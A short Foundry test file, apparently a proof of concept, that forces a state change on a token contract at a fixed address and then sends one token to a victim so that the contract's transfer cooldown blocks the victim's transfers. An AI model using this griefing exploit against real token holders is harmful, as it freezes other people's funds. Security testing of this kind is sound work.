pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface BNRG {
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function state() external view returns (uint8);
    function transfer(address receiver, uint256 numTokens) external returns (bool);
    // Added missing function to interface
    function lastTx(address) external view returns (uint256); 
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    BNRG public i_bnrg = BNRG(TARGET);
    address public owner;
    address public victim = makeAddr("victim");

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {

        // Force the contract state to 'Restricted' (1) by writing to storage slot 10.
        // This bypasses the issue where the state on the forked chain might not be 'Locked'.
        vm.store(TARGET, bytes32(uint256(10)), bytes32(uint256(1)));

        assertEq(uint(i_bnrg.state()), 1, "State should be Restricted");

        deal(TARGET, attacker, 1 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The attacker sends a minimal amount of tokens to the victim.
        // This updates lastTx[victim], preventing the victim from making any transfers.
        i_bnrg.transfer(victim, 1);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
